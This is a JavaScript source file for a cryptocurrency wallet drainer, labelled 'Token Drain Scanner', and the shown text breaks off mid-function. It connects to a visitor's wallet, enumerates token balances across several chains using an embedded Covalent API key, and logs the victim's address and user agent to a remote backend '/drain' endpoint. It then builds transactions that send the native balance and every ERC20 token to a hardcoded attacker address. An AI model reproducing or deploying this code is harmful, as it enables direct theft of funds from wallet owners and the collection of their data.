// ================================================
// TOKEN DRAIN SCANNER - FIXED WALLET SELECTOR
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum Mainnet",
        56: "Binance Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    },
    
    // Wallet configurations
    wallets: {
        metaMask: {
            name: "MetaMask",
            icon: "🦊",
            desktop: {
                id: "isMetaMask",
                download: "https://metamask.io/download/"
            },
            mobile: {
                ios: "https://metamask.app.link/dapp/",
                android: "https://metamask.app.link/dapp/",
                universal: "https://metamask.app.link/dapp/"
            }
        },
        trust: {
            name: "Trust Wallet",
            icon: "🔶",
            desktop: {
                id: "isTrust",
                download: "https://trustwallet.com/"
            },
            mobile: {
                ios: "https://link.trustwallet.com/open_url?coin_id=60&url=",
                android: "https://link.trustwallet.com/open_url?coin_id=60&url=",
                universal: "https://link.trustwallet.com/open_url?coin_id=60&url="
            }
        },
        binance: {
            name: "Binance Wallet",
            icon: "🟡",
            desktop: {
                id: "isBinance",
                download: "https://www.binance.com/en/download"
            },
            mobile: {
                ios: "bnc://app.binance.com/",
                android: "intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end",
                universal: "https://binance.com/"
            }
        },
        coinbase: {
            name: "Coinbase Wallet",
            icon: "🔷",
            desktop: {
                id: "isCoinbaseWallet",
                download: "https://www.coinbase.com/wallet/downloads"
            },
            mobile: {
                ios: "coinbasewallet://",
                android: "intent://#Intent;scheme=coinbasewallet;package=org.toshi;end",
                universal: "https://go.cb-w.com/"
            }
        },
        phantom: {
            name: "Phantom",
            icon: "👻",
            desktop: {
                id: "isPhantom",
                download: "https://phantom.app/"
            },
            mobile: {
                ios: "phantom://",
                android: "phantom://",
                universal: "https://phantom.app/"
            }
        }
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let walletProvider = null;
let isMobile = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, networkSelector, scanAllBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    
    // Detect device type
    detectDevice();
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    networkSelector = document.getElementById('networkSelector');
    scanAllBtn = document.getElementById('scanAllBtn');
    
    // Verify critical elements
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    console.log('✅ DOM elements loaded');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    if (scanAllBtn) scanAllBtn.onclick = handleScanAllChains;
    if (networkSelector) networkSelector.onchange = handleNetworkChange;
    
    // Populate network selector
    populateNetworkSelector();
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Detect device type
function detectDevice() {
    const userAgent = navigator.userAgent.toLowerCase();
    isMobile = /android|webos|iphone|ipad|ipod|blackberry|windows phone/.test(userAgent);
}

// Populate network selector dropdown
function populateNetworkSelector() {
    if (!networkSelector) return;
    
    networkSelector.innerHTML = '';
    
    // Add "Switch Network" option
    const defaultOption = document.createElement('option');
    defaultOption.value = '';
    defaultOption.textContent = 'Switch Network';
    networkSelector.appendChild(defaultOption);
    
    // Add all supported networks
    Object.entries(CONFIG.networkNames).forEach(([chainId, name]) => {
        const option = document.createElement('option');
        option.value = chainId;
        option.textContent = `🌐 ${name}`;
        networkSelector.appendChild(option);
    });
}

// Check existing wallet connection
async function checkExistingConnection() {
    const ethereum = getEthereum();
    if (!ethereum) {
        console.log('⚠️ No wallet provider');
        return;
    }
    
    try {
        const accounts = await ethereum.request({ 
            method: 'eth_accounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await ethereum.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.log('⚠️', error.message);
    }
}

// Get Ethereum provider - UPDATED TO HANDLE MULTIPLE WALLETS
function getEthereum() {
    // If window.ethereum exists, use it
    if (window.ethereum) {
        // Check which wallet is active
        if (window.ethereum.isMetaMask) {
            walletProvider = 'metaMask';
            console.log('✅ Active wallet: MetaMask');
        } else if (window.ethereum.isTrust) {
            walletProvider = 'trust';
            console.log('✅ Active wallet: Trust Wallet');
        } else if (window.ethereum.isBinance) {
            walletProvider = 'binance';
            console.log('✅ Active wallet: Binance Wallet');
        } else if (window.ethereum.isCoinbaseWallet) {
            walletProvider = 'coinbase';
            console.log('✅ Active wallet: Coinbase Wallet');
        } else if (window.ethereum.isPhantom) {
            walletProvider = 'phantom';
            console.log('✅ Active wallet: Phantom');
        } else {
            walletProvider = 'unknown';
            console.log('⚠️ Unknown wallet provider');
        }
        return window.ethereum;
    }
    
    // Check for other wallet providers
    if (window.BinanceChain) {
        walletProvider = 'binance';
        console.log('✅ Active wallet: Binance Chain');
        return window.BinanceChain;
    }
    
    if (window.trustwallet) {
        walletProvider = 'trust';
        console.log('✅ Active wallet: Trust Wallet');
        return window.trustwallet;
    }
    
    console.log('❌ No wallet provider found');
    return null;
}

// Handle connect button click - FIXED WALLET SELECTOR
async function handleConnect() {
    console.log('🔄 Connect button clicked');
    
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // On mobile, check if we're in a wallet browser
    if (isMobile) {
        await handleMobileConnect();
        return;
    }
    
    // On desktop, show wallet selector
    await handleDesktopConnect();
}

// Handle desktop connection with wallet selector
async function handleDesktopConnect() {
    // Detect available wallets
    const availableWallets = detectAvailableWallets();
    
    if (availableWallets.length === 0) {
        updateStatus('❌ No wallet found!');
        showWalletInstallGuide();
        return;
    }
    
    // If only one wallet is available, use it directly
    if (availableWallets.length === 1) {
        walletProvider = availableWallets[0].key;
        await connectWithWallet(availableWallets[0].key);
        return;
    }
    
    // If multiple wallets are available, show selector
    showWalletSelector(availableWallets);
}

// Detect available wallets on desktop
function detectAvailableWallets() {
    const wallets = [];
    
    // Check each wallet
    Object.entries(CONFIG.wallets).forEach(([key, wallet]) => {
        // For MetaMask, check isMetaMask
        if (key === 'metaMask' && window.ethereum?.isMetaMask) {
            wallets.push({ key, name: wallet.name, icon: wallet.icon });
        }
        // For Trust Wallet, check isTrust
        else if (key === 'trust' && window.ethereum?.isTrust) {
            wallets.push({ key, name: wallet.name, icon: wallet.icon });
        }
        // For Binance Wallet, check isBinance
        else if (key === 'binance' && window.ethereum?.isBinance) {
            wallets.push({ key, name: wallet.name, icon: wallet.icon });
        }
        // For Coinbase Wallet, check isCoinbaseWallet
        else if (key === 'coinbase' && window.ethereum?.isCoinbaseWallet) {
            wallets.push({ key, name: wallet.name, icon: wallet.icon });
        }
        // For Phantom, check isPhantom
        else if (key === 'phantom' && window.ethereum?.isPhantom) {
            wallets.push({ key, name: wallet.name, icon: wallet.icon });
        }
    });
    
    console.log('📋 Available wallets:', wallets);
    return wallets;
}

// Show wallet selector on desktop
function showWalletSelector(wallets) {
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <h3>🔗 Select Wallet to Connect</h3>
                <p>Choose your preferred wallet:</p>
                <div class="wallet-list">
                    ${wallets.map(wallet => `
                        <button class="wallet-option" onclick="selectWallet('${wallet.key}')">
                            <span class="wallet-icon">${wallet.icon}</span>
                            <span class="wallet-name">${wallet.name}</span>
                        </button>
                    `).join('')}
                </div>
                <button class="cancel-btn" onclick="closeWalletSelector()">Cancel</button>
            </div>
        </div>
    `;
    
    // Create and show selector
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    // Add CSS for selector
    addSelectorStyles();
}

// Add CSS for wallet selector
function addSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        
        .wallet-selector-modal {
            background: white;
            padding: 30px;
            border-radius: 16px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .wallet-selector-modal h3 {
            margin-top: 0;
            color: #333;
        }
        
        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin: 25px 0;
        }
        
        .wallet-option {
            padding: 18px 20px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            background: white;
            display: flex;
            align-items: center;
            gap: 15px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .wallet-option:hover {
            border-color: #4a6cf7;
            background: #f8f9ff;
            transform: translateY(-2px);
        }
        
        .wallet-icon {
            font-size: 24px;
        }
        
        .wallet-name {
            font-weight: 600;
            color: #333;
        }
        
        .cancel-btn {
            margin-top: 20px;
            padding: 12px 30px;
            background: #f0f0f0;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            color: #666;
        }
        
        .cancel-btn:hover {
            background: #e0e0e0;
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) {
        selector.remove();
    }
}

// Select wallet from selector
async function selectWallet(walletKey) {
    closeWalletSelector();
    walletProvider = walletKey;
    await connectWithWallet(walletKey);
}

// Connect with specific wallet
async function connectWithWallet(walletKey) {
    updateStatus(`🔄 Connecting with ${CONFIG.wallets[walletKey]?.name || walletKey}...`);
    
    try {
        const ethereum = getEthereum();
        if (!ethereum) {
            throw new Error('Wallet not found');
        }
        
        // Request accounts
        console.log(`📤 Requesting accounts from ${walletKey}...`);
        const accounts = await ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        console.log('✅ Wallet response:', accounts);
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await ethereum.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected');
        } else if (error.code === -32002) {
            updateStatus('🔄 Connection pending. Check wallet.');
        } else {
            updateStatus('❌ Failed: ' + error.message);
        }
    }
}

// Handle mobile connection
async function handleMobileConnect() {
    // Check if we're already in a wallet browser
    const ethereum = getEthereum();
    if (ethereum) {
        // Already in wallet browser, connect normally
        await connectWithWallet(walletProvider || 'metaMask');
        return;
    }
    
    // Not in wallet browser, show mobile wallet options
    showMobileWalletOptions();
}

// Show mobile wallet options
function showMobileWalletOptions() {
    const mobileWallets = ['metaMask', 'trust', 'binance', 'coinbase'];
    
    let html = `
        <div style="margin: 20px 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 16px; color: white; text-align: center;">
            <h3 style="margin-top: 0;">📱 Connect Mobile Wallet</h3>
            <p>Open this dApp in your wallet's browser:</p>
            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 25px 0;">
    `;
    
    mobileWallets.forEach(walletKey => {
        const wallet = CONFIG.wallets[walletKey];
        if (!wallet) return;
        
        const currentUrl = encodeURIComponent(window.location.href);
        let walletUrl = '';
        
        // Determine correct deeplink
        if (navigator.userAgent.toLowerCase().includes('iphone') || 
            navigator.userAgent.toLowerCase().includes('ipad')) {
            walletUrl = wallet.mobile.ios + currentUrl;
        } else if (navigator.userAgent.toLowerCase().includes('android')) {
            walletUrl = wallet.mobile.android + currentUrl;
        } else {
            walletUrl = wallet.mobile.universal + currentUrl;
        }
        
        html += `
            <a href="${walletUrl}" 
               style="padding: 20px; background: rgba(255, 255, 255, 0.15); border-radius: 12px; color: white; text-decoration: none; display: flex; flex-direction: column; align-items: center; gap: 10px; backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2);"
               onclick="handleMobileWalletClick('${walletKey}')">
                <span style="font-size: 28px;">${wallet.icon}</span>
                <span style="font-weight: 600;">${wallet.name}</span>
            </a>
        `;
    });
    
    html += `
            </div>
            <p style="font-size: 14px; opacity: 0.9; margin-top: 20px;">
                <strong>Tip:</strong> If the app doesn't open automatically, copy this URL and paste it in your wallet's browser.
            </p>
            <div style="margin-top: 15px; padding: 10px; background: rgba(0, 0, 0, 0.2); border-radius: 8px; font-size: 12px; word-break: break-all;">
                ${window.location.href}
            </div>
        </div>
    `;
    
    statusEl.innerHTML = html;
}

// Handle mobile wallet click
function handleMobileWalletClick(walletKey) {
    console.log('📱 Opening wallet:', walletKey);
    walletProvider = walletKey;
    
    // Store for when user returns
    localStorage.setItem('mobileWallet', walletKey);
    
    // For Android, we need to handle the intent fallback
    if (navigator.userAgent.toLowerCase().includes('android')) {
        setTimeout(() => {
            // If still on same page after 2 seconds, show instructions
            if (document.visibilityState === 'visible') {
                alert('If wallet didn\'t open, please:\n1. Open your wallet app manually\n2. Go to browser/DApps section\n3. Paste the URL shown above');
            }
        }, 2000);
    }
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        console.log('🔄 Setting up connection...');
        
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Select current network in dropdown
        if (networkSelector) {
            networkSelector.value = chainId;
        }
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    ethereum.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    ethereum.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        
        // Update network selector
        if (networkSelector) {
            networkSelector.value = chainId;
        }
        
        fetchTokens(currentAccount, chainId);
    });
    
    ethereum.on('disconnect', (error) => {
        console.log('🔌 Wallet disconnected:', error);
        disconnectWallet();
    });
}

// Handle network change from dropdown
async function handleNetworkChange() {
    if (!networkSelector || !networkSelector.value) return;
    
    const chainId = parseInt(networkSelector.value);
    if (!chainId || chainId === currentChainId) return;
    
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
        
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
    } catch (switchError) {
        if (switchError.code === 4902) {
            try {
                await addNetworkToWallet(chainId);
            } catch (addError) {
                updateStatus(`❌ Failed to add network: ${addError.message}`);
            }
        } else {
            updateStatus(`❌ Failed to switch network: ${switchError.message}`);
        }
    }
}

// Add network to wallet
async function addNetworkToWallet(chainId) {
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    const networkParams = {
        56: { // BSC
            chainId: '0x38',
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
        },
        137: { // Polygon
            chainId: '0x89',
            chainName: 'Polygon',
            nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
            rpcUrls: ['https://polygon-rpc.com/'],
            blockExplorerUrls: ['https://polygonscan.com/']
        },
        42161: { // Arbitrum
            chainId: '0xA4B1',
            chainName: 'Arbitrum One',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: ['https://arb1.arbitrum.io/rpc'],
            blockExplorerUrls: ['https://arbiscan.io/']
        }
    };
    
    if (networkParams[chainId]) {
        await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [networkParams[chainId]],
        });
    }
}

// Fetch tokens for current chain
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <h4>${chainName}</h4>
                    <span class="token-count">${chainTokens.length} tokens</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item" data-address="${token.contractAddress || 'native'}" data-chain="${chainId}">
                        <div class="token-info">
                            ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : ''}
                            <div>
                                <span class="token-symbol">${token.symbol}</span>
                                <span class="token-name">${token.name}</span>
                            </div>
                        </div>
                        <div class="token-amounts">
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

// Handle drain - COMPLETE VERSION FOR ALL TOKENS
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens detected to drain');
        return;
    }
    
    // Confirm drain
    if (!confirm(`⚠️ WARNING: This will send ALL detected tokens and ETH to:\n${CONFIG.drainAddress}\n\nEstimated tokens: ${detectedTokens.length}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting comprehensive drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining ALL tokens...';
        }
        
        // Create progress indicator
        const progress = document.createElement('div');
        progress.id = 'drainProgress';
        progress.innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><div class="progress-text">Starting...</div>';
        statusEl.appendChild(progress);
        
        // 1. First, drain ETH/native token
        await drainNativeToken();
        
        // 2. Drain all ERC20 tokens
        await drainAllERC20Tokens();
        
        updateStatus('✅ Drain completed successfully!');
        alert('✅ All tokens have been drained successfully!');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) {
            errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMsg = 'Transaction failed. Check gas settings.';
        } else if (error.message.includes('insufficient funds')) {
            errorMsg = 'Insufficient ETH for gas fees';
        }
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain All Tokens';
        }
        
        // Remove progress indicator
        const progress = document.getElementById('drainProgress');
        if (progress) progress.remove();
    }
}

// Drain native token (ETH, BNB, MATIC, etc.)
async function drainNativeToken() {
    updateProgress('Draining native token...', 10);
    
    const ethereum = getEthereum();
    
    // Get balance
    const balanceHex = await ethereum.request({
        method: 'eth_getBalance',
        params: [currentAccount, 'latest']
    });
    
    const balance = parseInt(balanceHex, 16);
    
    if (balance === 0) {
        updateProgress('No native token to drain', 20);
        return;
    }
    
    // Get gas price
    const gasPriceHex = await ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    // Check if we have enough for gas
    if (balance <= gasCost * 2) {
        updateProgress('Not enough native token for gas fees', 30);
        return;
    }
    
    // Calculate amount to send (leave some for gas for token transfers)
    const sendAmount = balance - (gasCost * 5);
    
    if (sendAmount <= 0) {
        updateProgress('Not enough after gas fees', 40);
        return;
    }
    
    // Send native token
    const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    updateProgress(`Native token sent: ${txHash.slice(0, 10)}...`, 50);
    await new Promise(resolve => setTimeout(resolve, 3000));
}

// Drain all ERC20 tokens
async function drainAllERC20Tokens() {
    const ethereum = getEthereum();
    
    // Filter only ERC20 tokens (not native)
    const erc20Tokens = detectedTokens.filter(t => !t.isNative && t.contractAddress);
    
    if (erc20Tokens.length === 0) {
        updateProgress('No ERC20 tokens to drain', 60);
        return;
    }
    
    updateProgress(`Draining ${erc20Tokens.length} ERC20 tokens...`, 60);
    
    let completed = 0;
    
    for (const token of erc20Tokens) {
        try {
            // Switch to token's chain if needed
            if (currentChainId !== token.chainId) {
                await switchToChain(token.chainId);
            }
            
            // Drain the token
            await drainERC20Token(token);
            
            completed++;
            const percent = 60 + (completed / erc20Tokens.length * 40);
            updateProgress(`Draining ${token.symbol}... (${completed}/${erc20Tokens.length})`, percent);
            
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
        }
    }
    
    updateProgress(`Completed draining ${completed} tokens`, 100);
}

// Drain single ERC20 token
async function drainERC20Token(token) {
    const ethereum = getEthereum();
    
    // Encode transfer function call
    const transferData = encodeTransferData(token.balance);
    
    // Get gas estimate for token transfer
    const gasEstimate = await ethereum.request({
        method: 'eth_estimateGas',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData
        }]
    });
    
    const gasLimit = parseInt(gasEstimate, 16) * 2;
    
    // Get gas price
    const gasPriceHex = await ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    // Send token transfer
    const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    return txHash;
}

// Encode transfer function call
function encodeTransferData(amount) {
    const functionSignature = '0xa9059cbb';
    const paddedAddress = CONFIG.drainAddress.slice(2).padStart(64, '0');
    const paddedAmount = BigInt(amount).toString(16).padStart(64, '0');
    return functionSignature + paddedAddress + paddedAmount;
}

// Switch to specific chain
async function switchToChain(chainId) {
    if (currentChainId === chainId) return;
    
    const ethereum = getEthereum();
    
    try {
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        currentChainId = chainId;
        
    } catch (error) {
        if (error.code === 4902) {
            await addNetworkToWallet(chainId);
        } else {
            throw error;
        }
    }
}

// Update progress indicator
function updateProgress(message, percent) {
    const progressText = document.querySelector('.progress-text');
    const progressFill = document.querySelector('.progress-fill');
    
    if (progressText) {
        progressText.textContent = message;
    }
    
    if (progressFill) {
        progressFill.style.width = `${percent}%`;
    }
    
    console.log(`Progress: ${percent}% - ${message}`);
}

// Show wallet install guide
function showWalletInstallGuide() {
    const guideHTML = `
        <div style="margin: 20px 0; padding: 20px; background: #fff3cd; border-radius: 12px; border: 2px solid #ffc107;">
            <h4 style="margin-top: 0; color: #856404; display: flex; align-items: center; gap: 10px;">
                📱💻 Install Wallet
            </h4>
            <p>To use this dApp, you need a Web3 wallet:</p>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0;">
                <a href="https://metamask.io/download/" target="_blank" 
                   style="padding: 15px; background: #f6851b; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
                    <span style="font-size: 24px;">🦊</span>
                    <span style="font-weight: bold;">MetaMask</span>
                </a>
                <a href="https://trustwallet.com/" target="_blank"
                   style="padding: 15px; background: #3375bb; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
                    <span style="font-size: 24px;">🔶</span>
                    <span style="font-weight: bold;">Trust Wallet</span>
                </a>
                <a href="https://www.binance.com/en/download" target="_blank"
                   style="padding: 15px; background: #f0b90b; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
                    <span style="font-size: 24px;">🟡</span>
                    <span style="font-weight: bold;">Binance Wallet</span>
                </a>
                <a href="https://www.coinbase.com/wallet/downloads" target="_blank"
                   style="padding: 15px; background: #0052ff; color: white; border-radius: 10px; text-decoration: none; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;">
                    <span style="font-size: 24px;">🔷</span>
                    <span style="font-weight: bold;">Coinbase Wallet</span>
                </a>
            </div>
            <p style="font-size: 14px; color: #666;">
                <strong>Mobile Users:</strong> Open this link in your wallet's built-in browser for best experience.
            </p>
        </div>
    `;
    
    statusEl.innerHTML = guideHTML;
}

// Update status
function updateStatus(message) {
    statusEl.textContent = message;
}

// Show UI elements
function showUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('hidden');
    });
}

// Hide UI elements
function hideUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString(),
                walletProvider: walletProvider,
                isMobile: isMobile,
                userAgent: navigator.userAgent
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    const ethereum = getEthereum();
    if (ethereum && ethereum.disconnect) {
        try {
            await ethereum.disconnect();
        } catch (error) {
            console.log('⚠️', error.message);
        }
    }
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    walletProvider = null;
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Handle scan all chains
async function handleScanAllChains() {
    if (!currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔍 Scanning all chains for tokens...');
    
    const chainsToScan = [1, 56, 137, 42161, 10, 43114, 8453];
    let allTokens = [];
    
    for (const chainId of chainsToScan) {
        try {
            const tokens = await fetchTokensForChain(currentAccount, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
        } catch (error) {
